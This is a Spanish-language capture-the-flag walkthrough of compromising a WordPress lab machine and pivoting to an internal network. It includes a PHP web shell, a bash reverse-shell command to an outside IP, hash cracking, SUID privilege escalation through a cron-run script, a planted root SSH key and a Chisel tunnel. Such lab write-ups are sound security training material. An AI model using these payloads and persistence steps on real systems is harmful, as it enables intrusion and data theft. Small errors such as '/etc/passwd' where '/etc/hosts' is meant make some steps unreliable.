## Summary

Tags: #Pivoting #Linux #SSH #HTTP #WordPress #PHP #ReverShell #MySQL #Apache #John #BashShell #CRON #SUID #Chisel 

- IP ->  192.168.111.38
- Ports -> TCP (22,80), UDP (idk)
- OS ->  Linux
- Services & Applications
    - 22 -> OpenSSH 7.9p1 Debian 10+deb10u2
    - 80 -> Apache httpd 2.4.38

## Launchpad

-   **Launchpad**: [https://launchpad.net/ubuntu](https://launchpad.net/ubuntu)

* Launchpad OpenSSH 7.9p1 Debian 10+deb10u2   ->   Buster
* Launchpad Apache httpd 2.4.38   ->   Buster

## Recon

```bash
❯ arp-scan -I ens33 --localnet --ignoredups              # Para hacer un escaneo de la red 

	# I = i mayuscula; es la interface ens33
	# ignoredups = Ignora IPs duplicadas 
```

```bash 
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn ❮Target IP❯  -oG allPorts
```

```bash
❯ nmap -sCV -p22,80 ❮Target IP❯ -oN targeted
```

```bash
❯ whatweb ❮http://IP❯                  # Nos dara una breve descripcion del gestor de contenidos del puerto 80

	# Mirar la jQuery
	# Servidor Web
```

Nos disponemos  a ver la web, después como no hay nada, le haremos fuzzing.

```bash
❯ gobuster dir -u http://192.168.111.38/ -w /usr/share/Seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -x html,php,txt -b 404

	# dir = Enumerar directorios y archivos 
	# x = Buscar por extenciones html,php,txt

# Encontramos un dir llamado '/blog/'
```

En la pagina web, en el dir '**/blog/**' nos muestra una web muy 'mal'. Miramos su código fuente y encontramos que esta tratando de hacer un 'virtual hosting' a la siguiente dirección '(**aragog.howarts y wordpress.aragog.howarts**)'. Por lo que, agregamos ese dominio a nuestro '**/etc/passwd**'

* Esta web es un WordPress 5.0.12

Usaremos la herramienta del WP
```bash
❯ wpscan --url http://192.168.111.38/blog/ -e u,vp --plugins-detection aggressive                      # Enumeracion 

	# u = Enumerar usuarios
	# vp = Enumerar plugins vulnerables
	# plugins-detection = Enumeracion de plugins (mixed, passive, aggressive)
```

Cuando no nos reporta nada de los plugins, debemos de usar el **API  Token**
El **API Token** lo podemos descargar registrándonos desde la siguiente url:
* [API-Token](https://wpscan.com/register)

```bash
❯ wpscan --url <http://URL/> -e u,vp --plugins-detection aggressive --api-token="DFFGB15GDDG618GD81GRD"     # Enumeracion 

	# vp = Enumerar plugins vulnerables
	# api-token = Nos representa de mejor manera las vulnerabilidades con el API Token
```

Ahora si nos enumera algunas vulnerabilidades y en ellas encontramos que a través de una subida de un archivo lo podemos llevar a un RCE (Remote Code Ejecution). Nos dan un link en donde nos explican un poco y ahí nos dan otro link en donde podemos descargar el exploit en Python. 

Para podernos descargar el exploit .py hacemos lo siguiente. 
```bash
❯ wget http://❮IP❯/                   # Para poder descargar un el exploit a nuestra maquina de atacante 
```

Al momento de revisar el exploit nos damos cuenta que trata de abrir un archivo .php que es el que subirá, pero ese aun no existe. Por lo que, nos disponemos a crearlo en el mismo entorno de trabajo que el exploit. 
```php 
❯ nvim payload.php

	<?php 
		echo "<prep>" . shell_exec($_GET['cmd']) . "</prep>";
	?>
```

Ejecutamos el exploit 
```bash 
❯ python3 2020-wp-file.py http://192.168.111.38/blog/        # Ejecutamos el exploit y le colocamos la url que tiene el WP vulnerable para que suba el archivo payload.php
```

Ahora, la url que nos devuelve el script es la que debemos de colocar en el navegador y en ella podremos ejecutar comandos:
```bash 
❯ http://192.168.111.38/blog/wp-content/plugins/wp-file-manager/lib/files/payload.php                      # Url original en donde se subio el payload
 
❯ http://192.168.111.38/blog/wp-content/plugins/wp-file-manager/lib/files/payload.php?cmd=whoami           # Url con el comando a ejecutar whoami = www-data  
❯ http://192.168.111.38/blog/wp-content/plugins/wp-file-manager/lib/files/payload.php?cmd=ip a             # Url con el comando a ejecutar ip a y ahi miramos dos redes

# Url con el comando a ejecutar y asi obtener una ReverShell
❯ http://192.168.111.38/blog/wp-content/plugins/wp-file-manager/lib/files/payload.php?cmd=bash -c "bash -i >& /dev/tcp/10.10.14.13/443 0>&1"   

# Recordemos que en la URL de la web debemos de cambiar los & -> %26
❯ http://192.168.111.38/blog/wp-content/plugins/wp-file-manager/lib/files/payload.php?cmd=bash -c "bash -i >%26 /dev/tcp/10.10.14.13/443 0>%261"
```

Ahora antes de hacer la ReverShell nos debemos de colocar en escucha por el puerto 443 de nuestra maquina de atacante
```bash
❯ nc -nlvp 443 
```

## User

Ganamos acceso como el usuario '**www-data**'

Hacemos un tratamiento de la TTY
```bash
❯ python3 -c ‘import pty;pty.spawn(“/bin/bash”)’         # Para remplazar el comando de 'Script' por si no lo acepta la consola

❯ Script /dev/null -c bash
❯ Ctrl + z
❯ stty raw -echo; fg
❯ reset xterm

# Despues cambiamos esto para poder hacer Ctrl+ l y Ctrl + c
❯ echo $SHELL                                            # Para ver la ruta de shell y ver que valor tiene **/usr/bin/nologin**
❯ export SHELL=bash o ❯ export SHELL=/bin/bash           # Hacemos que shell ahora valga bash
❯ export TERM=xterm                                      # Para poder hacer Ctrl +c y Ctrl + l (l=ele)

# Ahora para modificar las dimensiones de Vim/nano debemos hacer lo siguiente.
❯ stty size                                              # Miramos las dimensiones de la consola
❯ stty rows 51 columns 189                               # Modificamos las dimensiones de la consola Vim/Nano
```

En el **/home/hagrid98** podemos encontrar la primer flag, pero com esta en base64 hacemos lo siguiente 
```bash
❯ echo "9g8yg5w908yn5w689==" | base64 -d: echo           # Decodificar el base64 y nos revela el contenido de la flag 
```

Como lo que hemos estado explotando es un WordPress, este contiene un archivo especifico llamado **wp-config.php** que contiene credenciales de acceso a la base de datos y mayormente se encuentra en la siguiente ruta: **/var/www/html** 

Como no lo encontramos, recordamos que también estamos usando **Apache** 
**/etc/apache2/sites-enabled/** Ruta de Apache y ahí encontramos el **wordpress.conf** que nos dice la ruta de en donde esta montado todo el WordPress en la maquina victima 

Si miramos el contenido podemos  ver la ruta **/usr/share/wordpress/**, encontramos el **wp-config.php** que dispone de las credenciales para la base de datos. 

Al momento de visualizar el archivo, observamos que no contiene credenciales pero tiene una nueva ruta de un archivo. 
```bash 
❯ cat /etc/wordpress/config-default.php              # Archivo que contiene las credenciales user:root|passwd:mySecr3tPass, crdenciales que son para la base de datos y no para algun usuario de la maquina 
```

Nos conectamos a la DB MySQL para buscar credenciales de los usuarios existentes en la maquina. 
```bash
❯  mysql -u root -p                                  # Nos conectamos a MySQL y le proporcionamos la password encontrada

	> show databases;                                # Muestra todas las bases de datos existentes
	> use ❮DB_name❯;                                 # Usamos una base de datos especifica
	> show tables;                                   # Mostramos el contenido de las tablas de la base de datos elegida
	> describe ❮Table_name❯;                         # Miramos que columnas existen
	> select * from ❮Table_name❯;                    # Seleccionamos todo de la tabla users

# Encontramos al usuario hagrid98 y su passwd que tiene un hash que lo podemos crackear para ver la pass en texto claro 
```

Colocamos el hash encontrado en un archivo llamado 'hash', para después tratar de romperlo con fuerza bruta con la herramienta John The Ripper
```bash
❯ john --wordlist=/usr/share/wordlists/rockyou.txt <Hashfile>                              # Usamos John para crackear un hash con fuerza bruta

	# wordlist = Ruta del diccionario rockyou.txt
	# hashfile = Archivo que contiene el hash a crackear

# Nos regresa que la passwd del usuario hagrid98:password123
```

```bash
❯  ssh hagrid98@192.168.111.38                                 # Para conectarnos por ssh en el puerto default 22
```

```bash
❯ lsb_release -a                             # Miramos algunas caracteristicas de la maquina Linux 

# Miramos que la version de Debian es Buster
```

## Root

Ahora somo el usuario '**hagrid98**'

Por lo que buscaremos la forma escalar privilegios y ser root. 

```bash 
❯ id                     # Para ver a que grupos estamos asignados 
```

```bash
❯ sudo -l                                          # Ver que permisos tenemos en el sudoer y poder ejecutar como root algun comando
```

```bash 
❯ find / -perm -4000 2>/dev/null                  # Para ver que comandos son SUID, los buscamos desde la raiz 
❯ find / -perm -4000 -ls 2>/dev/null              # Para ver que comandos son SUID, los buscamos desde la raiz y ademas miramos el privilegio
```

```bash 
❯ find / -user <username> 2>/dev/null             # Para ver que comandos donde el propiertario es es usuario

# Encontramos un script en la siguiente ruta  ./opt/.backup.sh
# Que al hacerle 'cat' al 'backup.sh' nos muestra que esta haciendo una copia de forma recursiva de lo que hay en la carpeta al /tmp/tmp_wp_uploads
# Si miramos lo que hay en /tmp/tmp_wp_uploads, observamos que el propietario es root 
```

Procedemos a modificar el script de bash './opt/.backup.sh' ya que como 'hagrid98' somos el propietario. 
```bash 
❯ nano ./opt/.backup.sh          # Le cambiaremos el privilegio a la bash para convertirla en SUID y asi lanzar una shell privilegiada y operar como root

chmod u+s /bin/bash              # Haremos que root le asigne una SUID a la bash  
```

```bash 
❯ watch -n 1 ls -l /bin/bash    # Monitorizar la bash cada segundo con el siguiente comando
❯ bash -p                       # Lanzamos una bash con privilegios temporales 
```

Podemos buscar la flag de root en su /home/root/.

## Pivoting 

Siendo root primero debemos de garantizar el acceso directo a esta maquina y lo haremos colocando con un acceso ssh. 
```bash 
❯ cd /root/ 
❯ cd .ssh/           # Aqui crearemos una 'Authorized Key' publica para podernos conectar y tener una persistencia de acceso directo 
```

En nuestra maquina de atacante nos vamos a crear una clave publica y una clave privada 
```bash 
❯ ssh-keygen                                                     # Creamos una clave publica y una clave privada en nuestra maquina de atacante 
❯ cat ~/.ssh/id_rsa.pub | tr -d '\n' | xclip -sel clip           # Miramos el contenido de nuestra clave publica    
	# ~ = /home/omar/...
	# tr = Quitar el salto de linea
	# xclip = Copiarno el output en la clipboard

# El resultado lo pegaremos en el archivo que crearemos con nombre 'authorized_keys' en la ruta de la maquina victima que es /root/.ssh
❯ nano authorized_keys
```

Una vez garantizado el acceso, procedemos a realizar lo siguiente:
Siendo root miramos las interfaces 
```bash
❯ hostname -I                                # Nos muestra solo la direccion IP de las interfaces 

# Podemos observar que hay dos interfaces, primera con la 192.168.111.38 y la segunda con la IP 10.10.0.128 
```

```bash 
❯ cd /tmp/                                   # Este directorio tiene privilegios de lectura y escritura, por lo que ahi podemos crear scripts
```

Crearemos un archivo llamado 'HotsDiscovery.sh' que nos ayude a ver la trazas ICMP para descubrir las demás interfaces. 
Para ir descubriendo interfaces con el comando ping 
```bash 
!#/bin/bash 

for i in $(seq 1 254); do
	timeout 1 bash -c "ping -c 1 10.10.0.$i" &>/dev/null && echo "[+] Host 10.10.0.$i - ACTIVE" &
done; wait  
```

Le damos permisos de ejecución
```bash 
❯ chmod +x HotsDiscovery.sh       # Le damos permisos de ejecucion 
❯ ./HotsDiscovery.sh              # Ejecutamos y logramos encontrar la IP 10.10.0.129
```

Por si el comando ping no esta disponible, podemos hacerlo por los puertos mas comunes 
```bash
!#/bin/bash 

for i in $(seq 1 254); do
	for port in 21 22 80 443 445 8080; do
		timeout 1 bash -c "echo '' > /dev/tcp/10.10.0.$i/$port" &>/dev/null && echo "[+] Host 10.10.0.$i - PORT $port - OPEN" &
	done 
done; wait 
```


Para poder llegar a la IP 10.10.0.129 desde nuestra maquina de atacante, podemos usar **Chisel** la cual nos creara un túnel 

1. Descargamos Chisel a nuestra maquina de atacante 'Chisel > Releases > chisel_1.8.1_linux_amd64.gz'
* [Chisel](https://github.com/jpillora/chisel)

2. Descomprimimos y le damos permisos de ejecución 
```bash 
❯ gunzip <file.gz>                           # Para descompirmir archivos gzip
❯ chmod +x chisel
```

3. Lo transferimos a la maquina victima mediante un servidor HTTP 
```bash
❯ python3 -m http.server 80                 # Nos montamos un servidor http 80
```

4. Desde la maquina victima lo descargamos de la siguiente manera 
```bash
❯ wget http://❮IP❯/chisel                   # Para poder cargar o descargar un archivo especifico desde una IP de atacante
```

5. Lo ejecutamos de la siguiente manera para hacer que solo se abra una sola sesión principal que será la de la maquina de atacante. 
```bash
❯ ./chisel server --reverse -p 1234                                                 # Server 'Maquina de atacante', nuestra IP es 192.169.111.106
❯ ./chisel client 192.168.111.106:1234 R:socks # Cliente 'Maquina victima'

	# R = Remote Port Forwarding
	# IP-Server = IP de la maquina atacante
	# Port-Server = Puerto de la maquina atacante
     # socks = Abre el puerto 1080 de nuestra de atacante 
```

```bash
❯ lsof -i:80                                # Para ver que servicio esta ocupando cierto puerto
```

Debemos de hacer los siguientes cambios después de crear el túnel 
```bash 
❯ nano /etc/proxychains.conf 

# Comentamos el Dinamic_chain, este solo se habilita cuando vamos pasando por varios tuneles
# Activamos el strick_chain, este solo es cuando tenemos un tunel 
# Hasta abajo del archivo agregamos lo siguiente:

sock5 127.0.0.1 1080 
```

Forma de verificar 
```bash 
❯ proxychains nmap -sT -Pn --top-ports 500 -open -T5 -v -n ❮Target IP❯ 2>/dev/null      # Este nos ayudara que el comando pase por el tunel creado por chisel 
```

[![Pasted%20image%2020230606000420.png](https://i.postimg.cc/XN1zQ39m/Pasted%20image%2020230606000420.png)](https://postimg.cc/LhfD8cC3)
